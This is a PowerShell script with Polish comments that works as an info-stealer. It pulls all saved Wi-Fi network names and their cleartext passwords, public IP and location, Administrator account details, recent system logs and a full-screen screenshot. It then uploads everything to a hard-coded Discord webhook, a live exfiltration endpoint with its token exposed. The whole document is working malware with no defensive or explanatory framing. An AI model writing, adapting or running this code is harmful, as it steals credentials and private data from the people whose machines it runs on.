Add-Type -AssemblyName System.Windows.Forms,System.Drawing

# Webhook bez ukrywania
$w='https://discord.com/api/webhooks/1361318439314128928/0ysFUO-d6BMEU4T7fQmlHVCAU2lK8-3gr-HgTDMOwu3QZ1ikm1_k9t9LAPMLM1IBg--z'

# 1. Zbieranie danych
$t=(netsh wlan show profiles|Select-String ':(.+)$'|%{ $p=$_.Matches.Groups[1].Value.Trim(); (netsh wlan show profile name="$p" key=clear|Select-String 'Key Content.+:(.+)$'|%{ "$p : "+$_.Matches.Groups[1].Value.Trim() }) })
try { $i=Invoke-RestMethod 'https://ipinfo.io/json' -UseBasicParsing; $ip="IP: $($i.ip) | $($i.city) | $($i.region) | $($i.country) | $($i.org)" } catch { $ip="IP Info: Błąd" }
try { $a=net user Administrator } catch { $a="Brak danych Admin" }
try { $l=Get-EventLog -LogName System -Newest 20|Out-String } catch { $l="Brak logów" }

# Zbierz wszystko w jedną zmienną
$txt="=== WIFI ===`r`n"+($t -join "`r`n")+"`r`n=== IP ===`r`n$ip`r`n=== ADMIN ===`r`n$a`r`n=== LOGI ===`r`n$l"

# 2. Screenshot ekranu do RAM
$b=[Windows.Forms.Screen]::PrimaryScreen.Bounds
$m=New-Object Drawing.Bitmap $b.Width,$b.Height
[Drawing.Graphics]::FromImage($m).CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size)
$s=New-Object IO.MemoryStream
$m.Save($s,[Drawing.Imaging.ImageFormat]::Png)
$s.Position=0

# 3. Przygotowanie multipart/form-data
$bd=[guid]::NewGuid().ToString()
$lf="`r`n"
$h=@{'Content-Type'="multipart/form-data; boundary=$bd"}

$p=(
    "--$bd",
    'Content-Disposition: form-data; name="files[0]"; filename="info.txt"',
    'Content-Type: text/plain',
    '',
    $txt,
    "--$bd",
    'Content-Disposition: form-data; name="files[1]"; filename="screen.png"',
    'Content-Type: image/png',
    '',
    ''
) -join $lf

$q="`r`n--$bd--`r`n"

# Składanie body
$start=[Text.Encoding]::UTF8.GetBytes($p)
$end=[Text.Encoding]::UTF8.GetBytes($q)
$scr=$s.ToArray()

$body=[byte[]]::new($start.Length+$scr.Length+$end.Length)
[Buffer]::BlockCopy($start,0,$body,0,$start.Length)
[Buffer]::BlockCopy($scr,0,$body,$start.Length,$scr.Length)
[Buffer]::BlockCopy($end,0,$body,$start.Length+$scr.Length,$end.Length)

# 4. Wysyłka
Invoke-RestMethod -Uri $w -Method Post -Headers $h -Body $body
